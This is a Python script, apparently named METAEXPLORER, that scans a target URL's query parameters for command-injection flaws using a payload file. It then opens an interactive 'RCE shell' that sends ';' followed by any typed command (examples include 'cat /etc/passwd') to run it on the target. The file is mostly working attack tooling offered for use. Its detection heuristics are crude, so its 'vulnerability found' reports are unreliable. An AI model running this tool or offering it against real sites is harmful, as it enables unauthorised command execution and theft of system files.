#!/usr/bin/env python3
import sys
import requests
import urllib.parse
import time
import random
import string
from colorama import Fore, Style, init

init(autoreset=True)

class RCEScanner:
    def __init__(self, target_url=None):
        self.target_url = target_url
        self.rce_payloads = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        })
        self.vulnerable_param = None
        self.successful_payload = None
        self.vulnerable_url = None
        
    def load_rce_payloads(self):
        try:
            with open('rce.txt', 'r', encoding='utf-8', errors='ignore') as f:
                self.rce_payloads = [line.strip() for line in f if line.strip()]
            print(f"{Fore.GREEN}[INFO] Loaded {len(self.rce_payloads)} RCE payloads")
        except FileNotFoundError:
            print(f"{Fore.RED}[ERROR] rce.txt file not found")
            return False
        return True
    
    def parse_url(self):
        parsed = urllib.parse.urlparse(self.target_url)
        params = urllib.parse.parse_qs(parsed.query)
        
        simple_params = {}
        for key, value in params.items():
            simple_params[key] = value[0] if value else ""
            
        return parsed, simple_params
    
    def generate_random_string(self, length=8):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def detect_rce_vulnerability(self, response, payload, random_marker):
        text = response.text.lower()
        
        if random_marker.lower() in text:
            return True
            
        indicators = [
            'root:', 'bin/bash', 'daemon:', 'sys:', 'www-data:',
            'administrator', 'windows', 'system32', 'program files',
            'uid=', 'gid=', 'groups=', 'login@', 'hostname:',
            'cannot', 'command not found', 'permission denied', 'no such file'
        ]
        
        if any(indicator in text for indicator in indicators):
            return True
            
        if len(response.text) != self.original_length:
            if abs(len(response.text) - self.original_length) > 50:
                return True
                
        return False
    
    def find_rce_vulnerability(self):
        print(f"{Fore.YELLOW}[*] Starting RCE vulnerability scan...")
        
        parsed_url, params = self.parse_url()
        
        if not params:
            print(f"{Fore.RED}[-] No parameters found in URL")
            return False
        
        try:
            original_response = self.session.get(self.target_url, timeout=10)
            self.original_length = len(original_response.text)
        except:
            self.original_length = 0
        
        tested_params = 0
        found_vulnerability = False
        
        for param_name, original_value in params.items():
            tested_params += 1
            print(f"{Fore.WHITE}[TEST] Parameter: {param_name} ({tested_params}/{len(params)})")
            
            random_marker = self.generate_random_string(12)
            
            for i, payload_template in enumerate(self.rce_payloads):
                if i % 100 == 0:
                    print(f"{Fore.CYAN}[PROGRESS] {i}/{len(self.rce_payloads)} payloads")
                
                try:
                    payload = payload_template.replace("MARKER", random_marker)
                    
                    test_params = params.copy()
                    test_params[param_name] = payload
                    new_query = urllib.parse.urlencode(test_params)
                    test_url = urllib.parse.urlunparse((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        parsed_url.path,
                        parsed_url.params,
                        new_query,
                        parsed_url.fragment
                    ))
                    
                    response = self.session.get(test_url, timeout=8, allow_redirects=False)
                    
                    if self.detect_rce_vulnerability(response, payload, random_marker):
                        print(f"{Fore.GREEN}[+] RCE vulnerability found in parameter '{param_name}'!")
                        print(f"{Fore.GREEN}[+] Payload: {payload}")
                        print(f"{Fore.GREEN}[+] Marker: {random_marker}")
                        
                        self.vulnerable_param = param_name
                        self.successful_payload = payload_template
                        self.vulnerable_url = test_url
                        self.original_params = params.copy()
                        
                        found_vulnerability = True
                        break
                        
                except Exception:
                    continue
            
            if found_vulnerability:
                break
        
        if not found_vulnerability:
            print(f"{Fore.RED}[-] No RCE vulnerabilities found")
        
        return found_vulnerability
    
    def execute_rce_command(self, command):
        if not self.vulnerable_param:
            return None, None, None
            
        parsed_url, params = self.parse_url()
        
        # Создаем payload с командой
        payload = f";{command}"
        
        try:
            test_params = self.original_params.copy()
            test_params[self.vulnerable_param] = payload
            new_query = urllib.parse.urlencode(test_params)
            test_url = urllib.parse.urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                new_query,
                parsed_url.fragment
            ))
            
            response = self.session.get(test_url, timeout=10, allow_redirects=False)
            return response.text, response.status_code, test_url
            
        except Exception as e:
            return f"Error: {str(e)}", None, None
    
    def rce_shell_mode(self):
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                 RCE SHELL MODE                  ║")
        print(f"{Fore.CYAN}║           Full System Control                  ║")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝")
        
        if not self.find_rce_vulnerability():
            print(f"{Fore.RED}[-] RCE vulnerability not found!")
            return
        
        print(f"{Fore.GREEN}[+] RCE Shell activated!")
        print(f"{Fore.YELLOW}[INFO] Enter system commands")
        print(f"{Fore.CYAN}[EXAMPLES]: whoami, id, ls, cat /etc/passwd")
        print(f"{Fore.RED}[WARNING] You are responsible for your actions!")
        
        while True:
            try:
                cmd = input(f"{Fore.RED}rce-shell> ").strip()
                
                if cmd.lower() in ['exit', 'quit', 'q']:
                    break
                if not cmd:
                    continue
                    
                print(f"{Fore.YELLOW}[*] Executing: {cmd}")
                result, status_code, url = self.execute_rce_command(cmd)
                
                print(f"{Fore.GREEN}attack: FOUND")
                print(f"{Fore.GREEN}web results: {status_code}")
                print(f"{Fore.GREEN}payload: {cmd}")
                print(f"{Fore.GREEN}url: {url}")
                
                if result:
                    print(f"{Fore.CYAN}output: {result}")
                else:
                    print(f"{Fore.RED}output: No output")
                    
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[INFO] Exiting RCE Shell")
                break
            except Exception as e:
                print(f"{Fore.RED}[ERROR] {str(e)}")

def show_menu():
    print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗")
    print(f"{Fore.CYAN}║                 METAEXPLORER                    ║")
    print(f"{Fore.CYAN}║           RCE Specialized Scanner               ║")
    print(f"{Fore.CYAN}║                   v4.0                          ║")
    print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝")
    print()
    print(f"{Fore.WHITE}1. RCE Testing")
    print(f"{Fore.WHITE}2. RCE Shell (using your commands)")
    print(f"{Fore.WHITE}3. Exit")
    print()

def main():
    if len(sys.argv) == 1:
        # Interactive mode
        show_menu()
        
        while True:
            choice = input(f"{Fore.GREEN}Select option (1-3): ").strip()
            
            if choice == '1':
                url = input(f"{Fore.CYAN}Enter target URL: ").strip()
                if not url:
                    print(f"{Fore.RED}[-] URL is required")
                    continue
                    
                scanner = RCEScanner(url)
                if scanner.load_rce_payloads():
                    scanner.find_rce_vulnerability()
                    
            elif choice == '2':
                url = input(f"{Fore.CYAN}Enter target URL: ").strip()
                if not url:
                    print(f"{Fore.RED}[-] URL is required")
                    continue
                    
                scanner = RCEScanner(url)
                if scanner.load_rce_payloads():
                    scanner.rce_shell_mode()
                    
            elif choice == '3':
                print(f"{Fore.YELLOW}[INFO] Goodbye!")
                break
            else:
                print(f"{Fore.RED}[-] Invalid choice")
                
            show_menu()
            
    elif len(sys.argv) == 3:
        # Command line mode
        target_url = sys.argv[1]
        mode = sys.argv[2].lower()
        
        scanner = RCEScanner(target_url)
        if not scanner.load_rce_payloads():
            return
            
        if mode == 'rce':
            scanner.find_rce_vulnerability()
        elif mode == 'rce-shell':
            scanner.rce_shell_mode()
        else:
            print(f"{Fore.RED}[-] Unknown mode: {mode}")
            print(f"{Fore.YELLOW}Available modes: rce, rce-shell")
    else:
        print(f"{Fore.RED}Usage: python3 metaRce.py <URL> <mode>")
        print(f"{Fore.YELLOW}Or run without arguments for interactive menu")
        print(f"{Fore.YELLOW}Modes: rce, rce-shell")

if __name__ == "__main__":
    main()
